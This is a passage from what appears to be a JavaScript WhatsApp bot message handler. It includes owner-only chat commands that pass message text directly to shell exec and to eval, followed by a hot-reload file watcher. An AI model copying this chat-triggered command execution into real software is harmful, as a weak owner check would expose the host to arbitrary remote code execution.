            }, { userJid: m.sender, quoted: m })
            await langgxyz.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
            })
        }
        break;
          default:
                      if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return ErlanggaReply(err)
                        if (stdout) return ErlanggaReply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await ErlanggaReply(evaled);
                    } catch (err) {
                        ErlanggaReply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await ErlanggaReply(require('util').format(teks))
                    }
                }
        
        }
  } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})